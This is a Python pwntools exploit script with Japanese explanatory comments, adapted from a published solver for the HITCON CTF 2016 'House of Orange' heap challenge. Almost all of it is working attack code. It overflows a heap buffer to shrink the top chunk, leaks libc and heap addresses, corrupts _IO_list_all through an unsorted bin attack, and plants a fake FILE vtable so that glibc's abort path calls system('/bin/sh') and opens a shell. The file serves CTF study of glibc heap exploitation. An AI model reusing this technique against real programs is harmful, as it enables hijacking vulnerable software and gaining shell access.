#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# ぱくりました・コメントつけました・デバッグしやすいよう書き換えました・　https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py
# 元のソルバ作成者
# Author : Angelboy
# http://blog.angelboy.tw
# Writeup: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html

# でもWriteupはこっちのがわかりやすい: https://1ce0ear.github.io/2017/11/26/study-house-of-orange/

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys

# host = "52.68.192.99"
# port = 56746

binary_file = './houseoforange_22785bece84189e632567da38e4be0e0c4bb1682'
libc_file   = '/lib/x86_64-linux-gnu/libc.so.6' 

context.arch = 'amd64'
context.os   = 'linux'
#context.binary = binary_file  #contextをバイナリから設定してくれる
context.terminal  = ['tmux', 'split-window', '-h']
context.log_level = "DEBUG"

binary_o = ELF(binary_file)
libc_o   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }  #リモートのlibcをセットしたときに必要

# ちなみに、init-pwndbgというのは自分(戸祭)の環境で、素のgdbを読んだ後にこのコマンドを実行するとpwndbgが有効化されるように.gdbinitに書いてあるってだけ
# pedaは途中で切り替えても大丈夫だがpwndbgはファイルを読み込む前に起動しておかないとエラーになる
# あと最初にfileコマンドで読み込まないとダメ
gdbscript = '''
#init-pwndbg
file {binary_file}
#gef

# commands for fork-server
# set follow-fork-mode child
# set follow-fork-mode parent

# load structure info
# add-symbol-file symbol.o 0

# code base address and heap base address when PIC is enabled
set $code = 0x555555554000
set $heap = 0x555555757000

# define functions here

# define breakpoints here
'''.replace('{binary_file}', binary_file)

# パディングもしてくれるu64 (64bitアンパック)
def u64x(data):
    return u64(data.ljust(8, '\0'))

def p64x(*nums):
    data = ''
    for num in nums:
        data += p64(num)
    return data

def create_socket():
    remote_host = "hoge.com"
    port = 65525

    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        # ローカルで攻撃
        tube = process([binary_file], env=env, stderr=sys.stderr)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        # ローカルで攻撃してgdbをアタッチ
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        # リモートで攻撃（本番）
        tube = remote(remote_host, port)
    else:
        # デフォルトではローカルでgdbでデバッグ
        tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)

    return tube



# -------^^^以上テンプレ^^^----------

#いるのかここ？
gdbscript2 = '''
set follow-fork-mode child
init-pwndbg
b *0x7ffff7b2459c
c
'''

# コマンド1に相当
def build(r,size,name,price,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))

# コマンド2に相当
def see(r):
    r.recvuntil(":")
    r.sendline("2")
    data = r.recvuntil("+++++++++++++++++++++++++++++++++++++")
    return data

# コマンド3に相当
def upgrade(r,size,name,price,color):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))


def attack(r):
    ###############
    # 1. libcアドレスのリーク
    #
    #    freeされたばかりでunsorted_binに入っているchunkの中身を表示すれば、chunk->fdかなんかにmain_arenaのアドレスが入っているためlibcのリークができる。
    #
    #    しかしこのプログラムにはfreeが呼べるコマンドが無い。
    #    よって、次の動作を利用してfreeをする。
    #    「top chunkのサイズを小さくしておき、大きめのchunkを確保しようとすると、ヒープの拡張のため（？）にsysmallocが呼ばれ、ある条件に合致していると_int_freeが呼ばれる」
    #    ある条件: (要確認)
    #    - top_chunk->size > MINSIZE(0x10)
    #    - top_chunk->size < needed_size + MINSIZE
    #    - if( top_chunk->size && PREV_IN_USE != 0) 
    #    - old_top + oldsize are aligned
    ###############

    build(r,0x80,"ddaa",199,2)

    payload  = "a"*0x90
    payload += p32(0xdada) + p32(0x20) + p64(0)
    payload += p64(0) + p64(0xf31)                # top chunkのsizeをオーバーフローにより書き換えて小さ目にするため
    upgrade(r,0xb1,payload,123,3)                 # (Upgrade機能はnameの入力されるsizeをチェックしていないのでBOFができる)

    build(r,0x1000,"qqqqq",199,1)                 # trigger the _int_free in sysmalloc                 (mallocするとき、top_chunkのサイズが小さすぎるとヒープを拡張するために_sys_mallocが呼ばれ、さらに条件を満たすと_int_freeにより前のヒープを縮退だか解放だかする。)
    build(r,0x400,"aaaaaaa",199,2)                # create a large chunk and Leak the address of libc  (さっきfreeされた場所からchunkが確保されるようなサイズを要求する)

    # unsorted_binから確保されたchunkの中身を表示することで、chunkのリンクリスト用ポインタが保持しているmain_arenaのアドレスが見られる
    data    = see(r).split("Price")[0].split()[-1].ljust(8,"\x00")  
    libcptr =  u64(data)
    
 

    temp_libc_offset_main_arena = 0x3c4b20                                     # main_arenaのオフセット求めるスクリプトで調べる  https://github.com/bash-c/main_arena_offset かpwntoolsの機能で計算する（unsortedbin_addr - offset_unsortedbin_main_arenaみたいな感じで。直接求める機能はない？）https://webcache.googleusercontent.com/search?q=cache:mOI1xmXh7HkJ:https://github.com/amliaW4/amliaW4.github.io/blob/master/old_post/pwntools-code.md+&cd=2&hl=en&ct=clnk&gl=jp&lr=lang_en%7Clang_ja
    # デバッグシンボルつきのlibcから検索する方法もある `readelf -s /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so|grep main_arena` https://stackoverflow.com/questions/37960788/why-there-isnt-main-arena-in-libc-so-symbol-table-while-there-is-one-in-malloc
    temp_libc_offset_main_arena_plus1640 = temp_libc_offset_main_arena + 1640  # gdb + pwndbgのarenaコマンドとかで、繋がれてるbinsは<main_arena + 1640>のものだと調べる。<main_arena + 1640>はlarge_bins[35]だったはず

    libc = libcptr - temp_libc_offset_main_arena_plus1640  # オリジナルのlibcだと0x3c4188 = 0x3c3b20 + 0x668(=1640)
    print "leaked:",hex(libcptr)
    print "libc:",hex(libc)

    ###############
    # 2. heapのアドレスのリーク
    #
    #    いい感じのsizeを指定することで、large_binsから確保される。large_binsのchunkはfd_nextsizeやbk_nextsizeのメンバを持つ。これは別なlarge_chunkへのポインタのため、リークすればheapアドレスがわかったことになる
    ###############

    
    upgrade(r,0x400,"c"*16,245,1)                                             # Leak the address of heap (0x400サイズを指定してるから、その分のnameのバッファがlarge_binsから確保される)
    data    = ("\x00" +see(r).split("Price")[0].split()[-1]).ljust(8,"\x00")  # large_binsから確保されるchunkの中身を表示することで、chunkのリンクリスト用ポインタが保持しているheapのアドレスが見られる
    heapptr = u64(data)
    heap    = heapptr - 0x100
    print "heap:",hex(heap)

    io_list_all = libc + libc_o.symbols["_IO_list_all"]  # offset:0x3c5520                
    system      = libc + libc_o.symbols["system"]        # offset:0x045390                       
    vtable_addr = heap + 0x728-0xd0 

    print "io_list_all:",hex(io_list_all)
    print "system:", hex(system)
    print "vtable_addr:", hex(vtable_addr)

    ###############
    # 3. 

    #    FILE Structure Oriented Programming (FSOP)というのを使う。
    #    FSOPは、_IO_list_allの制御を奪うことで好きな関数を実行させるものである。 https://ptr-yudai.hatenablog.com/entry/2019/02/12/000202
    #    _IO_FILE_plus構造体のvtableというのがあり、そこに例えばfclose関数実行時に呼ばれる_IO_close_t関数のアドレスなどが入っている。
    #    今回はmallocが異常検知してabortルーチンに入った時に呼ばれる_IO_OVERFLOW関数のアドレスを書き換えて、system関数を呼ぶ。
   
    #    そのために、unsorted_bin unlink attackをして、_IO_list_allをunsorted_bin上のアドレスを指すように書き換える
    #    次に_IO_list_allをsmall_binsを指すように書き換える
    #    small_binsには偽のfile streamを作っておく。その構造体のvtableにはsystem関数のアドレスを書き込んでおく
    #    コマンド番号1のbuildを実行すると、mallocが実行され、chunk->sizeがMINSIZEより小さいので異常として検知されabortルーチンが実行される
    #    abortルーチンでは_IO_FILE構造体のvtableに入ってる_IO_OVERFLOW(*_IO_FILE);が実行され、その実態はsystem関数に書き換えられているのでsystem("/bin/sh")となりシェル起動。
    ################

    # _IO_list_all->chainが、次の_IO_FILE_plus構造体を指す
    # ((_IO_FILE *)_IO_FILE_plus->file )->_wide_dataが、_IO_FILE_plusを指す（自分の親を指している？なんでこんな構造なんだ）
    # とりえあえず_IO_FILE構造体は_wide_dataと_modeだけ適切に設定すれば動く.その親となる_IO_FILE_plus構造体はfileとvtableを適切に設定すれば動く


    payload  = "b"*0x410                                                 # 
    payload += p32(0xdada) + p32(0x20) + p64(0)                          # ? ここはなんでもいいはず...
    stream   = "/bin/sh\x00" + p64(0x61)            # fake file stream   # 0x61は、chunk->size (0x60) || PREV_IN_USE (0x01)。 unsortedchunk attack攻撃用。場所的には_IO_FILE構造体の_IO_read_ptrに当たるが意味はない# Unsortedchunk attackにより、ここを_IO_list_allが指すようになる。先頭に"/bin/sh"を書き込んでおくことで、mallocのabortルーチンで、_IO_OVERFLOWが呼ばれた時に"/bin/sh"が渡されることになる
    stream  += p64(0xdeadbeef) + p64(io_list_all-0x10) # Unsortbin attack    # Unsortedbin attackは、mallocが実行された後、unsorted_binにあるchunkがunlinkされるとき、(chunk->bkの指すアドレス+0x10)にunsortedbinのchunkのアドレスを書き込んでしまうことを利用した攻撃。
                                                                             # 以下のような処理が行われるためである。bck->fdというのがちょうど0x10のオフセットを持つ。
                                                                             #     /* remove from unsorted list */
                                                                             #      unsorted_chunks (av)->bk = bck;
                                                                             #      bck->fd = unsorted_chunks (av);
    stream   = stream.ljust(0xa0,"\x00")                                 # 適当に_IO_FILE構造体のメンバを0　で埋める
    print "_IO_FILE -> _wide_data:", hex(heap+0x700-0xd0)
    stream  += p64(heap+0x700-0xd0)                                      # _IO_FILE構造体の_wide_dataを(_IO_FILE_plus構造体を指すように)適切に設定する
    # 観察するときは↑をstream  += p64(0xaa)にでもして最後まで進める、んでgdbで `p *(_IO_list_all)`や、そのchain変数に設定されているものを `p *((struct _IO_FILE_plus *)0x555555758560)`で見てみる
    stream   = stream.ljust(0xc0,"\x00")                                 # 適当に_IO_FILE構造体のメンバを0　で埋める
    stream  += p64(1)                                                    # _IO_FILE構造体のmodeを適切に設定する。なんのmodeかわからないがf_openとかのときに指定するアレなら、0x1は"w"になるらしい。

    payload += stream
    payload += p64(0)                                                    # パディングっぽい?
    payload += p64(0)
    payload += p64(vtable_addr)                                          # _IO_FILE_plus構造体 (https://bit.ly/2Ypydfe) のvtableのポインタ?
    payload += p64(1)                                                    # パディングっぽい?
    payload += p64(2)
    payload += p64(3) 
    payload += p64(0)*3                                                  # vtableここから開始。最初3つのエントリはどうでもいいので0で埋める
    payload += p64(system)                                               # vtableのエントリの4つ目が_IO_overflow_tのもの
    upgrade(r,0x800,payload,123,3)                                       



    r.recvuntil(":")
    r.sendline("1") # trigger malloc and abort  (mallocが実行され、このときにunsortedbin attackが成立する。chunk->sizeがMINSIZEより小さいので異常として検知されmallocのabortルーチンが実行される。_IO_list_allから辿って全部の_IO_FILE_plus構造体のvtableの_IO_OVERFLOW関数が実行される?)

    r.interactive()

# -------^^^以下テンプレ^^^----------
if __name__ == '__main__':
    tube = create_socket()
    attack(tube)